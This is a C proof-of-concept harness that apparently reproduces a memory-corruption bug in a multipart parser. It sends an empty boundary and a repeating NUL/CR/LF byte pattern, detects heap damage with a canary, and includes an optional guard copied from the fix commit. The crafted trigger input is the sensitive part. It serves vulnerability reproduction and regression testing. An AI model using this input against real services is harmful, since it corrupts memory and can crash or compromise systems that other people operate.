/* Stages CVE-2026-116543 at the pinned sink in multipart_parser_execute().
 * The pinned v2.8.0 parser source is compiled verbatim; this file only
 * supplies callback stubs, the request body and the fixed-build guard
 * copied verbatim from fix commit 6820c274 (lib/sbi/message.c). */
#include <stddef.h>

#include "ogs-core.h"

#include "multipart_parser.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static int cb_data(multipart_parser *p, const char *at, size_t len)
{
	(void)p; (void)at; (void)len; return 0;
}
static int cb_notify(multipart_parser *p)
{
	(void)p; return 0;
}

static const multipart_parser_settings SETTINGS = {
	cb_data, cb_data, cb_data, cb_notify, cb_notify, cb_notify, cb_notify
};

/* Empty-boundary start, one header, CRLFCRLF framing, then the first byte
 * of part_data_boundary (LF). The repeating pattern that follows is the
 * only byte sequence that keeps the empty-boundary state machine feeding
 * itself: NUL matches multipart_boundary[0], CR matches lookbehind[0],
 * LF matches lookbehind[1], then each byte matches the one three writes
 * earlier. */
static const char PREFIX[] = "\r\na:\r\n\r\n\r";
static const char PATTERN[3] = { 0x00, '\r', '\n' };
#ifndef PATTERN_REPEAT
#define PATTERN_REPEAT 128
#endif

static void hexdump(const unsigned char *p, size_t n, const char *label)
{
	size_t i;
	printf("%s=", label);
	for (i = 0; i < n; i++)
		printf("%02x", p[i]);
	printf("\n");
}

int main(int argc, char **argv)
{
	setvbuf(stdout, NULL, _IONBF, 0);
	const char *mode = (argc > 1) ? argv[1] : "attack";
	const char *boundary = "";
	int attack = (strcmp(mode, "attack") == 0);
	unsigned char body[16 + 3 * PATTERN_REPEAT];
	size_t n = sizeof(PREFIX) - 1;
	size_t i, k = 0;
	multipart_parser *p;
	unsigned char *canary = NULL;
	size_t consumed;

	if (n + 1 + (attack ? 3 * PATTERN_REPEAT : 0) > sizeof(body))
		return 2;
	memcpy(body, PREFIX, n);
	body[n++] = '\n';
	if (attack) {
		for (i = 0; i < 3 * PATTERN_REPEAT; i++)
			body[n + i] = (unsigned char) PATTERN[k++ % 3];
		n += 3 * PATTERN_REPEAT;
	}

#ifdef FIXED_BUILD
	/* Verbatim from commit 6820c274, lib/sbi/message.c parse_multipart().
	 * The real caller owns 'boundary' and frees it; this harness passes a
	 * literal, so ogs_free() is deliberately given NULL. */
	if (!boundary[0]) {
		ogs_error("Empty multipart boundary");
		ogs_free(NULL);
		printf("MODE=%s BOUNDARY_LEN=0 RET=-1 CONSUMED=0\n", mode);
		return 0;
	}
#endif

	p = multipart_parser_init(boundary, &SETTINGS);
	if (p == NULL)
		return 3;
	canary = (unsigned char *) malloc(32);
	if (canary != NULL) {
		memset(canary, 0x5a, 32);
		hexdump(canary, 12, "CANARY-BEFORE");
	}
	consumed = multipart_parser_execute(p, (const char *) body, n);
	printf("MODE=%s BOUNDARY_LEN=0 RET=%zu LEN=%zu\n", mode, consumed, n);
	if (canary != NULL)
		hexdump(canary, 12, "CANARY-AFTER");
	multipart_parser_free(p);
	return 0;
}
